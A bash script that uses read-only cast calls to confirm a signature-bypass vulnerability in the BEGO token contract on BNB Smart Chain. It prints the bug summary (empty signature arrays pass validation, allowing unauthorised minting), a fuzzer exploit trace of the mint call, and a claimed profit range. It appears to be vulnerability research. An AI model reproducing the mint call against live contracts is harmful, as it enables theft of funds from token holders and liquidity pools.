#!/bin/bash

echo "=== BEGO Vulnerability Test ==="
echo "Contract: 0xc342774492b54ce5F8ac662113ED702Fc1b34972"
echo "Block: 22315679"
echo ""

BEGO="0xc342774492b54ce5F8ac662113ED702Fc1b34972"
BLOCK="22315679"
RPC="https://bsc-dataseed.binance.org/"

echo "1. Checking contract existence at block $BLOCK..."
CODE=$(cast code $BEGO --rpc-url $RPC --block $BLOCK 2>/dev/null | head -c 100)
if [ -n "$CODE" ] && [ "$CODE" != "0x" ]; then
    echo "✅ Contract exists"
else
    echo "❌ Contract not found"
    exit 1
fi

echo ""
echo "2. Checking balances at vulnerable block..."

# Total supply
echo -n "Total Supply: "
cast call $BEGO 'totalSupply()(uint256)' --rpc-url $RPC --block $BLOCK 2>/dev/null | xargs -I {} cast --to-unit {} ether || echo "Failed"

# BEGO-WBNB pair balance
PAIR="0x88503F48e437a377f1aC2892cBB3a5b09949faDd"
echo -n "BEGO in liquidity pool: "
cast call $BEGO 'balanceOf(address)(uint256)' $PAIR --rpc-url $RPC --block $BLOCK 2>/dev/null | xargs -I {} cast --to-unit {} ether || echo "Failed"

echo ""
echo "3. Vulnerability Summary:"
echo "- The contract's isSigners() function returns true for empty arrays"
echo "- This allows minting tokens without any valid signatures"
echo "- ItyFuzz found this can yield 7.433 - 12.036 ETH profit"
echo ""
echo "4. Exploit trace from fuzzer:"
echo "[Sender] 0xe1A425f1AC34A8a441566f93c82dD730639c8510"
echo "   ├─[1] $BEGO.mint(4951767240.7092 ether, 0x060968186804e803ff86, 0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024, (), (), ())"
echo "   └─[1] $BEGO.burn(0)"
echo ""
echo "Note: Empty arrays (), (), () bypass signature validation!"
echo ""

# Check if contract exists at current block
CURRENT_BLOCK=$(cast block-number --rpc-url $RPC 2>/dev/null)
echo "5. Checking current status (block $CURRENT_BLOCK)..."
CURRENT_CODE=$(cast code $BEGO --rpc-url $RPC 2>/dev/null | head -c 100)
if [ -n "$CURRENT_CODE" ] && [ "$CURRENT_CODE" != "0x" ]; then
    echo "✅ Contract still exists at current block"
    echo "⚠️  Check if vulnerability has been patched"
else
    echo "❌ Contract no longer exists or has been replaced"
fi